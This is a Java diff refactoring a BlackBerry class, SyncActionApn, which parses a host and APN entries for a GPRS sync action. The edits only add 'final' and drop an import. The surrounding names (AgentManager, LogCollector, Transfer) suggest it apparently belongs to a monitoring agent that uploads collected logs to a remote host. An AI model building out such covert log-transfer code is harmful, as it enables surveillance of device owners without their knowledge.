@@ -6,7 +6,6 @@ import java.util.Vector;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
-import blackberry.event.Event;
 import blackberry.log.LogCollector;
 import blackberry.transfer.Transfer;
 import blackberry.utils.Check;
@@ -38,17 +37,17 @@ public class SyncActionApn extends SyncAction {
         gprs = true;
     }
 
-    protected SyncActionApn(int actionId) {
+    protected SyncActionApn(final int actionId) {
         super(actionId);
     }
 
-    protected boolean parse(byte[] confParams) {
+    protected boolean parse(final byte[] confParams) {
         final DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
 
         try {
-            int hostLen = databuffer.readInt();
-            byte[] hostRaw = new byte[hostLen];
+            final int hostLen = databuffer.readInt();
+            final byte[] hostRaw = new byte[hostLen];
 
             databuffer.readFully(hostRaw);
             host = WChar.getString(hostRaw, true);
@@ -57,12 +56,12 @@ public class SyncActionApn extends SyncAction {
             debug.trace("host: " + host);
             //#endif
 
-            int entries = databuffer.readInt(); // readByte();
+            final int entries = databuffer.readInt(); // readByte();
             int len;
             byte[] stringRaw;
 
             for (int i = 0; i < entries; i++) {
-                Apn apn = new Apn();
+                final Apn apn = new Apn();
                 apn.mcc = databuffer.readInt(); // readShort();
                 apn.mnc = databuffer.readInt(); // readShort();
 
@@ -102,11 +101,11 @@ public class SyncActionApn extends SyncAction {
     }
 
     public String toString() {
-        StringBuffer sb = new StringBuffer();
+        final StringBuffer sb = new StringBuffer();
         sb.append("SyncApn " + host);
 
         for (int i = 0; i < apns.size(); i++) {
-            Apn apn = (Apn) apns.elementAt(i);
+            final Apn apn = (Apn) apns.elementAt(i);
             sb.append(apn);
             sb.append(" ");
         }
